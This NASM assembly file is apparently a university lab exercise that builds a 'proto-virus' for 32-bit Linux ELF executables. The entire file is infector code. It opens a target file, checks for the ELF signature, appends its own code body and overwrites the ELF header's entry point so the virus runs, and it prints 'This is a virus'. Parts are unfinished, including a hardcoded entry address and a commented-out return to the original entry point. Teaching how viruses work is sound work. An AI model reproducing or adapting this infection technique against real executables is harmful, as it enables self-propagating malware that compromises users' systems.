%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro  checkELF 1
	push dword %1
	call real_checkELF
	add esp, 4
%endmacro

%macro  print 2
	call get_my_loc
	sub ecx, next_i-%1
	
	write STDOUT, ecx, %2
%endmacro

%define	STDOUT	1

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:
	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

	print virus_msg, 16

	;open a file called ELFexec2cpy
		open FileName, RDWR, 0777
		cmp eax, -1
		je error_occured
	
	;check if ELFexec is elf file
		mov [ebp-4], eax
		checkELF [ebp-4]
		cmp eax, -1
		je error_occured

	;move the cursor of ELFexec to the end of the file (get file size on the way)
		lseek dword [ebp-4], 0, SEEK_END
		mov dword [ebp-8], eax

	;infecting ELFexec with this very code
	    mov ecx, virus_end       ; copy virus_end address
	    sub ecx, _start       ; copy virus_end address

	    write dword [ebp-4], _start, ecx


	;copy yhe elf header to the stack
		lseek dword [ebp-4], 0, SEEK_SET
		mov esi, ebp
		sub esi, 60							;52+4+4
		read dword [ebp-4], esi, 52
		;add esi, 24

		;sub ecx, 4
		lseek dword [ebp-4], -4, SEEK_END
		;lseek dword [ebp-4], 0, SEEK_SET
		add esi, 24
		write dword [ebp-4], esi, 4
		sub esi, 24
		lseek dword [ebp-4], 0, SEEK_SET
		

		mov dword [esi+24], 0x08048294
		;write STDOUT, esi, 4
		;swrite STDOUT, _start, 4
		;write STDOUT, esi, 52

	;copy the new elf header to the exec file
		lseek dword [ebp-4], 0, SEEK_SET
		mov esi, ebp
		sub esi, 60
		write dword [ebp-4], esi, 52

	;write STDOUT, ecx, 4
	close dword [ebp-4]
	mov eax, 1
	jmp VirusExit

	error_occured:
		print error_msg, 18
		mov eax, 0

		call get_my_loc
		sub ecx, next_i-PreviousEntryPoint

		jmp dword [ecx]
; You code for this lab goes here

VirusExit:
		add	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
		;jmp dword [PreviousEntryPoint]
		exit eax            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
;FileName:	db "makefile", 0
FileName:	db "ELFexec2cpy", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0
virus_msg:    db "This is a virus", 10 , 0

elf_magic:    db "ELF", 0
error_msg:    db "An error occured!", 10, 0

get_my_loc:
	call next_i

next_i:
	pop ecx
	ret

real_checkELF:
	push ebp
	mov ebp, esp

	sub esp, 4
	read dword [ebp+8], esp, 4
	mov ecx, ebp
	sub ecx, 3
	cmp byte [ecx], 'E'
	jne .not_ELF
	inc ecx
	cmp byte [ecx], 'L'
	jne .not_ELF
	inc ecx
	cmp byte [ecx], 'F'
	jne .not_ELF
	mov eax, 1

	jmp .end_checkELF

	.not_ELF:
		mov eax, -1
		jmp .end_checkELF

	.end_checkELF:

	add esp, 4

	mov esp, ebp
	pop ebp

	ret

PreviousEntryPoint: dd VirusExit
virus_end:
